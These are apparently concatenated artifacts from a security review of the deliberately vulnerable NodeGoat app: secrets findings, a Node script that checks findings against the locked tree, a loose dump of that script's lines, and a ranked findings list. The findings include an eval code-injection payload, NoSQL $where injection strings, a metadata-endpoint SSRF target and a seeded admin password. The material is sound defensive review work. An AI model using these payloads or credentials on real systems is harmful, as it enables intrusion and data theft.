Anyone who has read the repository can forge a signed session cookie. Fix: source the secret from an environment variable with no fallback, and rotate it.

- `secrets-config-logged-to-stdout` — Full application config, including the session secret, is written to stdout on every startup (`config/config.js:13`, CWE-532, confirmed) — `console.log(util.inspect(config, false, null))` logs the merged config object, which contains `cookieSecret` and `cryptoKey`, unredacted, to whatever captures process stdout. Fix: stop logging the full config object, or redact known-sensitive keys first.

- `secrets-committed-rsa-private-key` — A real RSA private key is committed to the repository under `artifacts/cert/server.key` (lines 1–15, CWE-321, likely) — a valid PEM RSA private key, not gitignored, paired with `artifacts/cert/server.crt`; `server.js` contains a commented-out `https.createServer` block that reads this exact file, so it is not wired into the currently-running HTTP-only server but is exactly what the code's own documented HTTPS fix would load verbatim. Fix: remove the key from the repo and its history, generate TLS material per deployment outside version control, and revoke/reissue it if it was ever actually deployed.

- `secrets-hardcoded-cryptokey-unused` — Hard-coded AES key committed in config; the code that would use it to encrypt SSN/DOB is currently commented out (`config/env/all.js:9`, CWE-321, possible) — the only consumer, `app/data/profile-dao.js`'s `encrypt`/`decrypt` helpers, is entirely inside a block comment, so nothing decrypts or encrypts with this key today; the identical key is also shown as example code in the in-app tutorial (`app/views/tutorial/a6.html`) that teaches enabling this exact fix, so a developer following the tutorial verbatim would activate it. Fix: if enabled, source the key from a secrets manager, not a literal duplicated in documentation.

- `secrets-zap-api-key-test-config` — OWASP ZAP proxy API key is hard-coded in dev/test config and used by the security test suite (`config/env/development.js:6`, CWE-798, confirmed) — the same literal appears in `config/env/test.js:6` and is read by `test/security/profile-test.js` to authenticate to a local ZAP instance on an internal test network (`192.168.56.20`); it only ever authenticates to that local scanning tool, not a production system. Fix: generate the key per test run or source it from CI secrets instead of committing a fixed value.

- **Git history.** Only the working tree at the locked commit was read; `git log -p` / a full-history secret scan (gitleaks/trufflehog) was not run, so a secret rotated out of `HEAD` but still present in an earlier commit would not have been found.

- **`node_modules` and third-party dependency source.** Not part of `target.json`'s locked file list and not read; a vendored dependency shipping its own hard-coded credential would not have been caught.

- **Runtime/deployed configuration.** This is a static read of the committed tree. Whatever `MONGODB_URI`, `NODE_ENV`, or other environment variables an actual deployment sets at runtime (Heroku config vars, a real docker-compose `.env`, a Kubernetes secret) were not observed and could differ from — or could still be missing for — the values discussed above.

- **Binary/compiled or minified vendor assets** under `app/assets/vendor/` (jQuery, Bootstrap, Chart libraries, font files) were not opened; they are unlikely to carry this application's secrets but were not searched byte-for-byte.

- **Non-secrets classes of vulnerability** (SQL/NoSQL injection, XSS, open redirect, CSRF, insecure cookie flags, ReDoS) surfaced by the same semgrep run are out of scope for this department and are left for the injection, platform, and access reviews; several of the semgrep hits listed under Scope and method (e.g. `express-open-redirect`, `express-cookie-session-no-httponly`, the `dsh-eval-on-input`/`code-string-concat` hits in `app/routes/contributions.js`) were read only far enough to confirm they carry no additional hard-coded credential, not triaged for their own vulnerability class.

- **`secrets-hardcoded-cryptokey-unused`** is reported at `possible` confidence and low severity specifically because the consuming code path is dead as shipped; if a future change re-enables `app/data/profile-dao.js`'s commented block, its severity should be reassessed as live (comparable to the session-secret finding).

1: #!/usr/bin/env node
2: // Mechanical examiner of a code-safety report. It is in the report
3: // repository's base commit, so no department can change what measures it.
4: //
5: //   node verify-safety-report.mjs --findings <path>  one department's findings
6: //   node verify-safety-report.mjs --findings <path> --list-invalid
7: //   node verify-safety-report.mjs --report           the merged report
8: //
9: // `--findings` decides one findings file against the target tree. Adding
10: // `--list-invalid` turns the same decision into a report: the failing ids go to
11: // stdout, one per line, and the exit code is 0, which is how the integration
12: // learns which findings to drop and disclose.
13: //
14: // `--report` decides SAFETY-REPORT.md and findings.json together, including the
15: // disclosure rule: every id any `findings/<department>.json` carries and
16: // findings.json does not must be named under `## What was not covered`.
17: //
18: // Exit 0 only when every rule holds; otherwise every failure is printed to
19: // stderr, one per line, and the exit code is 1. Node built-ins only, because
20: // this runs in a worktree that installs nothing.
21: import { createHash } from 'node:crypto'
22: import { existsSync, readdirSync, readFileSync } from 'node:fs'
23: import { basename, join, relative, resolve } from 'node:path'
24: 
25: /** Severities a finding may claim, most severe first. */
26: const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info']
27: 
28: /** How sure a finding's author is that the cited code is exploitable as described. */
29: const CONFIDENCES = ['confirmed', 'likely', 'possible']
30: 
31: /** Sections SAFETY-REPORT.md carries, in this order. */
32: const SECTIONS = [
33:   '## Résumé exécutif',
34:   '## Executive summary',
35:   '## Scope and method',
36:   '## Findings',
37:   '## What was not covered',
38:   '## Certificate',
39: ]
40: 
41: /** The claim the certificate must make verbatim, and the only claim this review supports. */
42: const HONESTY = 'This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".'
43: 
44: /** Claims no coverage this review can state would support. */
45: const OVERCLAIMS = /\bno vulnerabilities\b|\bfree of vulnerabilities\b|\b(?:is|are|was|were) secure\b|\bsafe to deploy\b|\bproven secure\b|\bfully audited\b/i
46: 
47: /** Text a report still carrying its template is refused for. */
48: const PLACEHOLDER = /\bTODO\b|\bTBD\b|\bFIXME\b|lorem ipsum|<placeholder>|PLACEHOLDER/i
49: 
50: /** String fields every finding states in prose. */
51: const PROSE_FIELDS = ['title', 'evidence', 'impact', 'fix']
52: 
53: /** How a file's text is compared with a finding's quoted snippet. */
54: const normalize = (text) => text.replace(/\s+/g, ' ').trim()
55: 
56: /** Lowercase hex SHA-256 of one buffer or string. */
57: const sha256 = (content) => createHash('sha256').update(content).digest('hex')
58: 
59: /**
60:  * Every file under one directory, relative and sorted, skipping the excluded names.
61:  * @param {string} root directory to walk
62:  * @param {string[]} exclude directory basenames never descended into
63:  * @returns {string[]} relative POSIX-ish paths, sorted
64:  */
65: function walk(root, exclude) {
66:   const found = []
67:   const descend = (directory) => {
68:     for (const entry of readdirSync(directory, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
69:       const path = join(directory, entry.name)
70:       if (entry.isDirectory()) {
71:         if (!exclude.includes(entry.name)) descend(path)
72:       } else if (entry.isFile()) found.push(relative(root, path))
73:     }
74:   }
75:   descend(root)
76:   return found.sort()
77: }
78: 
79: /** One target tree as the lock and the verifier both read it: the files, their digests, and their text. */
80: class Target {
81:   /**
82:    * @param {string} reportRoot the report repository the lock is committed in
83:    * @param {string[]} failures collector every rule appends to
84:    */
85:   constructor(reportRoot, failures) {
86:     this.failures = failures
87:     this.root = undefined
88:     this.files = new Map()
89:     this.lines = new Map()
90:     const lockPath = join(reportRoot, 'target.json')
91:     if (!existsSync(lockPath)) {
92:       failures.push('target.json is missing from this worktree; the base commit carries the lock of the tree under review')
93:       return
94:     }
95:     const lock = JSON.parse(readFileSync(lockPath, 'utf8'))
96:     this.root = lock.root
97:     this.exclude = lock.exclude ?? []
98:     this.digest = lock.sha256
99:     for (const [path, hash] of Object.entries(lock.files)) this.files.set(path, hash)
100:     this.checkTree()
101:   }
102: 
103:   /**
104:    * Refuse a target that changed since the base commit locked it: a finding
105:    * cites a line of the tree this program was asked to review, and a tree a
106:    * department edited is no longer that tree.
107:    */
108:   checkTree() {
109:     if (!existsSync(this.root)) {
110:       this.failures.push(`the target tree ${this.root} is not on this host, so no citation can be resolved`)
111:       this.root = undefined
112:       return
113:     }
114:     const present = walk(this.root, this.exclude)
115:     for (const path of present) {
116:       if (!this.files.has(path)) this.failures.push(`the target tree gained ${path} since the base commit locked it`)
117:     }
118:     for (const [path, hash] of this.files) {
119:       if (!present.includes(path)) {
120:         this.failures.push(`the target tree lost ${path} since the base commit locked it`)
121:         continue
122:       }
123:       if (sha256(readFileSync(join(this.root, path))) !== hash) {
124:         this.failures.push(`the target tree's ${path} changed since the base commit locked it; the target is read-only for this program`)
125:       }
126:     }
127:   }
128: 
129:   /**
130:    * The lines of one target file.
131:    * @param {string} path path relative to the target root
132:    * @returns {string[] | undefined} the file's lines, or undefined when it is not in the locked tree
133:    */
134:   linesOf(path) {
135:     if (this.root === undefined || !this.files.has(path)) return undefined
136:     if (!this.lines.has(path)) this.lines.set(path, readFileSync(join(this.root, path), 'utf8').split('\n'))
137:     return this.lines.get(path)
138:   }
139: 
140:   /**
141:    * Whether one `file:line` citation resolves in the locked tree.
142:    * @param {string} path path relative to the target root
143:    * @param {number} line 1-based line number
144:    * @returns {boolean} whether the file is under review and holds that line
145:    */
146:   resolves(path, line) {
147:     const lines = this.linesOf(path)
148:     return lines !== undefined && Number.isInteger(line) && line >= 1 && line <= lines.length
149:   }
150: }
151: 
152: /**
153:  * Decide one finding against the target tree.
154:  * @param {unknown} finding one entry of a findings file
155:  * @param {number} index its position, named when the entry has no usable id
156:  * @param {Target} target the locked tree the finding cites
157:  * @param {Set<string>} seen ids already used in this file
158:  * @returns {string[]} every rule this finding broke, empty when it holds
159:  */
160: function checkFinding(finding, index, target, seen) {
161:   const failures = []
162:   if (finding === null || typeof finding !== 'object' || Array.isArray(finding)) {
163:     return [`finding #${index + 1} is not a JSON object`]
164:   }
165:   const id = finding.id
166:   const name = typeof id === 'string' && id !== '' ? id : `#${index + 1}`
167:   const fail = (rule) => void failures.push(`${name}: ${rule}`)
168:   // Letters, digits, `-`, `_` and `.`: wide enough for both the `SEC-001`
169:   // numbering the knowledge pack's schema uses and a department-prefixed name.
170:   if (typeof id !== 'string' || !/^[A-Za-z0-9][\w.-]*$/.test(id)) fail('id must be letters, digits, dots, dashes or underscores')
171:   else if (seen.has(id)) fail('id is used twice in this file')
172:   else seen.add(id)
173:   if (typeof finding.cwe !== 'string' || !/^CWE-\d+$/.test(finding.cwe)) fail('cwe must match CWE-<number>')
174:   if (typeof finding.owasp !== 'string' || finding.owasp.trim() === '') fail('owasp must name the category')
175:   if (!SEVERITIES.includes(finding.severity)) fail(`severity must be one of ${SEVERITIES.join(', ')}`)
176:   if (!CONFIDENCES.includes(finding.confidence)) fail(`confidence must be one of ${CONFIDENCES.join(', ')}`)
177:   for (const field of PROSE_FIELDS) {
178:     if (typeof finding[field] !== 'string' || finding[field].trim() === '') fail(`${field} must be a non-empty string`)
179:   }
180:   if (!Array.isArray(finding.references) || finding.references.some(reference => typeof reference !== 'string')) {
181:     fail('references must be an array of strings')
182:   }
183:   const { file, line, endLine, snippet } = finding
184:   if (typeof file !== 'string' || file === '' || file.startsWith('/') || file.split('/').includes('..')) {
185:     fail('file must be a path relative to the target root')
186:     return failures
187:   }
188:   const lines = target.linesOf(file)
189:   if (lines === undefined) {
190:     fail(`file ${file} is not in the tree under review`)
191:     return failures
192:   }
193:   if (!Number.isInteger(line) || line < 1 || line > lines.length) {
194:     fail(`line ${JSON.stringify(line)} is outside ${file}, which has ${lines.length} lines`)
195:     return failures
196:   }
197:   const last = endLine === undefined ? line : endLine
198:   if (!Number.isInteger(last) || last < line || last > lines.length) {
199:     fail(`endLine ${JSON.stringify(endLine)} is outside ${file}, which has ${lines.length} lines`)
200:     return failures
201:   }
202:   if (typeof snippet !== 'string' || snippet.trim() === '') {
203:     fail('snippet must quote the cited line')
204:     return failures
205:   }
206:   const quoted = normalize(lines.slice(line - 1, last).join('\n'))
207:   if (normalize(snippet) !== quoted) {
208:     fail(`snippet does not match ${file}:${line}, which reads ${JSON.stringify(quoted.slice(0, 160))}`)
209:   }
210:   return failures
211: }
212: 
213: /**
214:  * Read one findings file.
215:  * @param {string} path the file to read
216:  * @param {string[]} failures collector a malformed file is reported on
217:  * @returns {unknown[]} the entries, empty when the file is missing or malformed
218:  */
219: function readFindings(path, failures) {
220:   if (!existsSync(path)) {
221:     failures.push(`${path} is missing`)
222:     return []
223:   }
224:   let parsed
225:   try {
226:     parsed = JSON.parse(readFileSync(path, 'utf8'))
227:   } catch (error) {
228:     failures.push(`${path} is not JSON: ${error.message}`)
229:     return []
230:   }
231:   if (!Array.isArray(parsed)) {
232:     failures.push(`${path} must be a JSON array of findings`)
233:     return []
234:   }
235:   return parsed
236: }
237: 
238: /**
239:  * Decide one findings file on its own.
240:  * @param {string} path the findings file
241:  * @param {Target} target the locked tree it cites
242:  * @returns {{ failures: string[], invalid: string[], findings: unknown[] }} the broken rules, the ids that broke them, and the entries
243:  */
244: function checkFindingsFile(path, target) {
245:   const failures = []
246:   const findings = readFindings(path, failures)
247:   const invalid = []
248:   const seen = new Set()
249:   findings.forEach((finding, index) => {
250:     const broken = checkFinding(finding, index, target, seen)
251:     if (broken.length === 0) return
252:     failures.push(...broken.map(rule => `${basename(path)}: ${rule}`))
253:     invalid.push(typeof finding?.id === 'string' ? finding.id : `#${index + 1}`)
254:   })
255:   return { failures, invalid, findings }
256: }
257: 
258: /**
259:  * The body of one section of the report.
260:  * @param {string} text the whole report
261:  * @param {string} heading the section heading, including its `##`
262:  * @returns {string} the text between this heading and the next one, empty when absent
263:  */
264: function section(text, heading) {
265:   const start = text.indexOf(`${heading}\n`)
266:   if (start === -1) return ''
267:   const body = text.slice(start + heading.length + 1)
268:   const next = body.search(/^## /m)
269:   return next === -1 ? body : body.slice(0, next)
270: }
271: 
272: /**
273:  * Decide SAFETY-REPORT.md, findings.json and the disclosure of what was dropped.
274:  * @param {string} root the report repository
275:  * @param {Target} target the locked tree the report cites
276:  * @returns {string[]} every rule the report broke
277:  */
278: function checkReport(root, target) {
279:   const reportPath = join(root, 'SAFETY-REPORT.md')
280:   if (!existsSync(reportPath)) {
281:     return [`SAFETY-REPORT.md is missing; REPORTING.md in this worktree states the sections it carries: ${SECTIONS.join(', ')}`]
282:   }
283:   const text = readFileSync(reportPath, 'utf8')
284:   const failures = []
285:   let previous = -1
286:   for (const heading of SECTIONS) {
287:     const at = text.indexOf(`${heading}\n`)
288:     if (at === -1) failures.push(`SAFETY-REPORT.md has no section ${JSON.stringify(heading)}`)
289:     else if (at < previous) failures.push(`SAFETY-REPORT.md has ${JSON.stringify(heading)} out of order; the order is ${SECTIONS.join(' then ')}`)
290:     else previous = at
291:   }
292:   const placeholder = PLACEHOLDER.exec(text)
293:   if (placeholder !== null) failures.push(`SAFETY-REPORT.md still carries placeholder text: ${JSON.stringify(placeholder[0])}`)
294:   const overclaim = OVERCLAIMS.exec(text)
295:   if (overclaim !== null) failures.push(`SAFETY-REPORT.md claims more than this review supports: ${JSON.stringify(overclaim[0])}`)
296: 
297:   const union = checkFindingsFile(join(root, 'findings.json'), target)
298:   failures.push(...union.failures)
299:   const findings = union.findings.filter(finding => typeof finding?.id === 'string')
300: 
301:   const keys = new Set()
302:   for (const finding of findings) {
303:     const key = `${finding.file}:${finding.line}:${finding.cwe}`
304:     if (keys.has(key)) failures.push(`findings.json states ${key} twice; the union is deduplicated by file, line and cwe`)
305:     keys.add(key)
306:   }
307: 
308:   const listed = section(text, '## Findings')
309:   for (const finding of findings) {
310:     if (!listed.includes(finding.id)) failures.push(`the Findings section does not cite ${finding.id}`)
311:   }
312:   // The lookbehind keeps a URL's `host:port` out of the citation vocabulary:
313:   // the host is preceded by a slash, so no citation ever starts there.

lines.text: // Mechanical examiner of a code-safety report. It is in the report
// repository's base commit, so no department can change what measures it.
// `--findings` decides one findings file against the target tree. Adding
// `--list-invalid` turns the same decision into a report: the failing ids go to
// stdout, one per line, and the exit code is 0, which is how the integration
// learns which findings to drop and disclose.
// `--report` decides SAFETY-REPORT.md and findings.json together, including the
// disclosure rule: every id any `findings/<department>.json` carries and
// findings.json does not must be named under `## What was not covered`.
// Exit 0 only when every rule holds; otherwise every failure is printed to
// stderr, one per line, and the exit code is 1. Node built-ins only, because
// this runs in a worktree that installs nothing.
import { basename, join, relative, resolve } from 'node:path'
/** Severities a finding may claim, most severe first. */
/** How sure a finding's author is that the cited code is exploitable as described. */
/** Sections SAFETY-REPORT.md carries, in this order. */
/** The claim the certificate must make verbatim, and the only claim this review supports. */

const HONESTY = 'This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".'
/** Claims no coverage this review can state would support. */
const OVERCLAIMS = /\bno vulnerabilities\b|\bfree of vulnerabilities\b|\b(?:is|are|was|were) secure\b|\bsafe to deploy\b|\bproven secure\b|\bfully audited\b/i
/** Text a report still carrying its template is refused for. */
/** String fields every finding states in prose. */
/** How a file's text is compared with a finding's quoted snippet. */
/** Lowercase hex SHA-256 of one buffer or string. */
* Every file under one directory, relative and sorted, skipping the excluded names.
* @param {string[]} exclude directory basenames never descended into
for (const entry of readdirSync(directory, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
/** One target tree as the lock and the verifier both read it: the files, their digests, and their text. */
* @param {string} reportRoot the report repository the lock is committed in
* @param {string[]} failures collector every rule appends to
failures.push('target.json is missing from this worktree; the base commit carries the lock of the tree under review')
for (const [path, hash] of Object.entries(lock.files)) this.files.set(path, hash)
* Refuse a target that changed since the base commit locked it: a finding
* cites a line of the tree this program was asked to review, and a tree a
* department edited is no longer that tree.
this.failures.push(`the target tree ${this.root} is not on this host, so no citation can be resolved`)
if (!this.files.has(path)) this.failures.push(`the target tree gained ${path} since the base commit locked it`)
this.failures.push(`the target tree lost ${path} since the base commit locked it`)
this.failures.push(`the target tree's ${path} changed since the base commit locked it; the target is read-only for this program`)
* The lines of one target file.
* @param {string} path path relative to the target root
* @returns {string[] | undefined} the file's lines, or undefined when it is not in the locked tree
* Whether one `file:line` citation resolves in the locked tree.
* @param {string} path path relative to the target root
* @returns {boolean} whether the file is under review and holds that line
return lines !== undefined && Number.isInteger(line) && line >= 1 && line <= lines.length
* Decide one finding against the target tree.
* @param {unknown} finding one entry of a findings file
* @param {number} index its position, named when the entry has no usable id
* @param {Target} target the locked tree the finding cites
* @param {Set<string>} seen ids already used in this file
* @returns {string[]} every rule this finding broke, empty when it holds
return [`finding #${index + 1} is not a JSON object`]
const name = typeof id === 'string' && id !== '' ? id : `#${index + 1}`
// Letters, digits, `-`, `_` and `.`: wide enough for both the `SEC-001`
// numbering the knowledge pack's schema uses and a department-prefixed name.
if (typeof id !== 'string' || !/^[A-Za-z0-9][\w.-]*$/.test(id)) fail('id must be letters, digits, dots, dashes or underscores')
else if (seen.has(id)) fail('id is used twice in this file')
if (typeof finding.cwe !== 'string' || !/^CWE-\d+$/.test(finding.cwe)) fail('cwe must match CWE-<number>')
if (typeof finding.owasp !== 'string' || finding.owasp.trim() === '') fail('owasp must name the category')
if (!SEVERITIES.includes(finding.severity)) fail(`severity must be one of ${SEVERITIES.join(', ')}`)
if (!CONFIDENCES.includes(finding.confidence)) fail(`confidence must be one of ${CONFIDENCES.join(', ')}`)
if (typeof finding[field] !== 'string' || finding[field].trim() === '') fail(`${field} must be a non-empty string`)
fail('references must be an array of strings')
const { file, line, endLine, snippet } = finding
fail('file must be a path relative to the target root')
fail(`file ${file} is not in the tree under review`)
fail(`line ${JSON.stringify(line)} is outside ${file}, which has ${lines.length} lines`)
const last = endLine === undefined ? line : endLine
fail(`endLine ${JSON.stringify(endLine)} is outside ${file}, which has ${lines.length} lines`)
fail('snippet must quote the cited line')
fail(`snippet does not match ${file}:${line}, which reads ${JSON.stringify(quoted.slice(0, 160))}`)
* @param {string[]} failures collector a malformed file is reported on
* @returns {unknown[]} the entries, empty when the file is missing or malformed
failures.push(`${path} must be a JSON array of findings`)
* Decide one findings file on its own.
* @param {Target} target the locked tree it cites
* @returns {{ failures: string[], invalid: string[], findings: unknown[] }} the broken rules, the ids that broke them, and the entries
const broken = checkFinding(finding, index, target, seen)
* The body of one section of the report.
* @param {string} heading the section heading, including its `##`
* @returns {string} the text between this heading and the next one, empty when absent
* Decide SAFETY-REPORT.md, findings.json and the disclosure of what was dropped.
* @param {Target} target the locked tree the report cites
return [`SAFETY-REPORT.md is missing; REPORTING.md in this worktree states the sections it carries: ${SECTIONS.join(', ')}`]
else if (at < previous) failures.push(`SAFETY-REPORT.md has ${JSON.stringify(heading)} out of order; the order is ${SECTIONS.join(' then ')}`)
if (placeholder !== null) failures.push(`SAFETY-REPORT.md still carries placeholder text: ${JSON.stringify(placeholder[0])}`)
if (overclaim !== null) failures.push(`SAFETY-REPORT.md claims more than this review supports: ${JSON.stringify(overclaim[0])}`)
if (keys.has(key)) failures.push(`findings.json states ${key} twice; the union is deduplicated by file, line and cwe`)
if (!listed.includes(finding.id)) failures.push(`the Findings section does not cite ${finding.id}`)
// The lookbehind keeps a URL's `host:port` out of the citation vocabulary:
// the host is preceded by a slash, so no citation ever starts there.
if (!target.resolves(path, Number(line))) failures.push(`the citation ${path}:${line} does not resolve in the tree under review`)
for (const heading of ['## Résumé exécutif', '## Executive summary']) {
if (stated === null) failures.push(`${heading} does not state a "- ${severity}: <count>" line`)
const uncovered = section(text, '## What was not covered')
for (const finding of readFindings(join(department, entry), failures)) {
failures.push(`${id} was dropped from findings.json and is not disclosed under "## What was not covered"`)
if (!certificate.includes(HONESTY)) failures.push(`the Certificate must state, verbatim: ${JSON.stringify(HONESTY)}`)
if (stated === null) failures.push('the Certificate does not state a "Verified findings: <count>" line')
else if (Number(stated[1]) !== findings.length) failures.push(`the Certificate states ${stated[1]} verified findings, and findings.json holds ${findings.length}`)
if (tree === null) failures.push('the Certificate does not state a "Target tree: <sha256>" line')
else if (tree[1] !== target.digest) failures.push(`the Certificate states target tree ${tree[1]}, and target.json locks ${target.digest}`)
// A department that found nothing states `[]` and says so in its report
// section: requiring a finding would buy one by inventing it.
if (failures.length === 0) console.log(`ok: SAFETY-REPORT.md and findings.json verified against ${target.root}`)

### critical

- `injection-eval-pretax` — Server-side code injection via eval() of the preTax contribution field (`app/routes/contributions.js:32`, CWE-95, confirmed) — Any authenticated user can submit a POST /contributions request with preTax set to arbitrary JavaScript (e.g. "require('child_process').execSync('id')") which runs with the full privileges of the Node.js server process, yielding remote code execution. Replace eval(req.body.preTax) with Number(req.body.preTax) or parseInt(req.body.preTax, 10) and reject non-numeric input before use.
- `injection-eval-aftertax` — Server-side code injection via eval() of the afterTax contribution field (`app/routes/contributions.js:33`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with afterTax set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.afterTax) with Number(req.body.afterTax) or parseInt(req.body.afterTax, 10) and reject non-numeric input before use.
- `injection-eval-roth` — Server-side code injection via eval() of the roth contribution field (`app/routes/contributions.js:34`, CWE-95, confirmed) — Any authenticated user can submit POST /contributions with roth set to arbitrary JavaScript, achieving remote code execution in the server process. Replace eval(req.body.roth) with Number(req.body.roth) or parseInt(req.body.roth, 10) and reject non-numeric input before use.
- `access-missing-role-benefits-view` — GET /benefits discloses every user's record, including plaintext passwords, with no admin-role check (`app/routes/index.js:55`, CWE-862, confirmed) — Any authenticated user, including one who just self-registered via /signup, can GET /benefits and receive every non-admin user's stored document -- name, email and plaintext password -- letting them log in as any other user in the system. Add the isAdmin middleware to this route, and stop returning the password field from getAllNonAdminUsers / the benefits view regardless.
- `secrets-db-seed-admin-password` — Database seed script hard-codes a plaintext admin password that the app compares directly at login (`artifacts/db-reset.js:18`, CWE-798, confirmed) — Anyone who deploys NodeGoat via the documented docker-compose or Heroku path — or anyone who simply knows this public repository — can log in as the admin user with userName "admin" / password "Admin_123" and reach every admin-only function the app exposes. Never seed a real deployment with a fixed credential; generate a random admin password at first boot (or require an operator-supplied one via environment variable/secret store), hash it with bcrypt before storing (the code to do so already exists commented out in this file and in app/data/user-dao.js), and force a password change on first login.
- `access-hardcoded-session-secret` — Session-signing secret is a hardcoded literal committed to the repository (`config/env/all.js:8`, CWE-798, confirmed) — Anyone with the source (this is a public repository) can compute a valid signature for any session id, including one carrying an arbitrary userId, and present it as a cookie to authenticate as any user -- including an admin -- without credentials. Read the secret from an environment variable / secret manager, generate it randomly per deployment, and rotate the committed value.
- `dependencies-underscore` — underscore 1.9.1 is within the range vulnerable to CVE-2021-23358 (arbitrary code execution via template()) (`package.json:23`, CWE-94, confirmed) — GHSA-cf4h-3jhx-xvhq lets an attacker who controls a value passed into underscore's `template()` function execute arbitrary JavaScript on the server; whether this app reaches that function with attacker-controlled input was not traced as part of this dependency-only review, so treat this as a confirmed vulnerable dependency with impact conditional on a call-site the code-review departments should check. Upgrade underscore to >=1.12.1 at minimum (fixes the code-execution advisory) and ideally to the current 1.13.8.

### high

- `injection-nosql-where-allocations` — NoSQL injection in allocations lookup via unsanitized $where threshold (`app/data/allocations-dao.js:78`, CWE-943, confirmed) — Any logged-in user can break out of the single-quoted string in the $where clause (e.g. threshold="0'; while(true){}; var x='" or "0'; return true; var x='") to run arbitrary JavaScript inside the MongoDB server for every document scanned, enabling data exfiltration across users or denial of service. Drop $where entirely and use a native query operator, e.g. { userId: parsedUserId, stocks: { $gt: parseInt(threshold, 10) } }, after validating threshold is a bounded integer.
- `data-002-cleartext-ssn-bank-storage` — SSN, date of birth, and bank account/routing numbers are stored unencrypted (`app/data/profile-dao.js:61`, CWE-312, confirmed) — Anyone with read access to the `users` collection - a DB backup, an admin, or an attacker who reaches the database through another flaw - obtains every user's social security number, date of birth, bank account number and routing number in plaintext, enabling identity theft and financial fraud. Encrypt ssn, dob, bankAcc and bankRouting at rest with an authenticated cipher (AES-GCM) using a per-record random IV and a key from a KMS/secrets manager, or use MongoDB field-level/client-side encryption; decrypt only when displaying to the owning user.
- `data-001-plaintext-password-storage` — User passwords are stored in the database as plaintext (`app/data/user-dao.js:25`, CWE-256, confirmed) — Anyone who can read the `users` collection - via a database backup, a NoSQL-injection foothold (the app already builds unsanitized $where queries in app/data/allocations-dao.js), or an insider with DB access - recovers every user's real login password in plaintext, including the admin account, enabling immediate account takeover and credential-stuffing against other services where the same password is reused. Hash passwords with bcrypt (or argon2id) before insert: `password: bcrypt.hashSync(password, bcrypt.genSaltSync(12))`, and compare with `bcrypt.compareSync(password, user.password)` in validateLogin instead of `===`.
- `access-no-ratelimit-login` — Login endpoint has no rate limiting or lockout in its middleware chain (`app/routes/index.js:34`, CWE-307, confirmed) — An attacker can submit unlimited login attempts against any username with no delay, lockout or CAPTCHA, making online credential stuffing and password guessing practical against every account. Add a per-account (not just per-IP) rate limiter or progressive lockout in front of handleLoginRequest, e.g. express-rate-limit or express-brute keyed on the submitted userName.
- `access-missing-role-benefits-update` — POST /benefits changes any user's benefit date with no admin-role check (`app/routes/index.js:56`, CWE-862, confirmed) — Any authenticated non-admin user can POST an arbitrary userId and benefitStartDate to change any other employee's benefits record; the feature is admin-only by design (see the commented-out isAdmin fix) but enforced nowhere at runtime. Add the existing isAdmin middleware to this route: app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits).
- `access-idor-allocations` — Allocations route trusts a user id taken from the URL instead of the session (`app/routes/index.js:63`, CWE-639, confirmed) — Any logged-in user can enumerate and read every other user's financial allocation data by walking the :userId path parameter; no ownership check exists anywhere on this route. Take the id from req.session.userId (as the commented-out code already shows) instead of req.params.userId, or verify req.params.userId === req.session.userId before querying.
- `injection-ssrf-research` — Server-side request forgery in research lookup builds the fetch URL from query parameters (`app/routes/research.js:15`, CWE-918, confirmed) — Any authenticated user can make the server issue requests to arbitrary hosts, including internal-only services, cloud metadata endpoints (e.g. 169.254.169.254), or localhost-bound admin interfaces, and the response body is echoed back verbatim in res.write(body) at line 25, turning the SSRF into a proxy for reading internal service responses. Validate req.query.url against an allowlist of permitted external hosts/schemes before issuing the request, or route the lookup through a fixed, server-controlled base URL plus a validated symbol parameter instead of a fully attacker-supplied URL.
- `data-004-secrets-logged-at-startup` — The session cookie secret and crypto key are printed to the console on every application start (`config/config.js:12`, CWE-532, confirmed) — Anyone with access to the process's stdout - container logs, a log aggregator (this app ships a Procfile for Heroku-style deployment), or a CI build log - obtains `cookieSecret`, letting them forge a valid express-session cookie for any user including the admin, and `cryptoKey`, the key intended for encrypting sensitive fields. Remove the unconditional config dump, or redact secret-shaped keys (cookieSecret, cryptoKey) before logging, e.g. log an allowlist of non-secret fields only.
- `dependencies-body-parser` — body-parser 1.18.3 is vulnerable to two denial-of-service advisories and pulls a vulnerable qs (`package.json:9`, CWE-400, confirmed) — An attacker can send a crafted request body that exhausts server resources before any route handler validation runs, taking the application down for all users. Upgrade body-parser to >=1.20.6 (npm audit reports a fix is available without a major bump); this also pulls a patched qs.
- `dependencies-express` — Express 4.16.4 carries an open-redirect advisory, a reflected-XSS advisory, and 6 further transitive advisories (`package.json:13`, CWE-601, confirmed) — A malformed URL reaching res.redirect() (or a raw path-to-regexp route) can send a victim to an attacker-controlled destination or reflect script back into the response; the transitive chain adds a further set of DoS and template-injection vectors on the same request path. Upgrade express past 4.21.2 (or to the current 5.x line); npm audit reports a fix is available in this repository's lockfile constraints.
- `dependencies-marked` — marked 0.3.5 has six known advisories including two sanitization-bypass/XSS issues and two ReDoS issues (`package.json:17`, CWE-79, confirmed) — Markdown containing a crafted data URI or entity sequence can bypass marked's own sanitization and render as executable script in a victim's browser, and several of the same inputs can hang the renderer via catastrophic backtracking. Upgrade marked to at least 0.3.19 for the pre-4.x advisories, or to the current major, and re-verify any output is still passed through the app's own HTML sanitization before being written to the page.
- `dependencies-mongodb` — mongodb driver 2.2.36 has a direct DoS advisory and a critical deserialization advisory in its bundled bson (`package.json:18`, CWE-502, confirmed) — A crafted document or query response reaching the vulnerable bson deserializer can crash the process or, per the advisory's classification, lead to unsafe deserialization; the current driver is over 40 minor releases and two major versions behind the maintained 7.x line, which has dropped this bson path entirely. Upgrade the mongodb driver (npm audit's suggested fix is the current major, 7.6.0); this is a breaking change to the driver API and will require touching every DAO file, so plan it as a scoped migration rather than a patch bump.
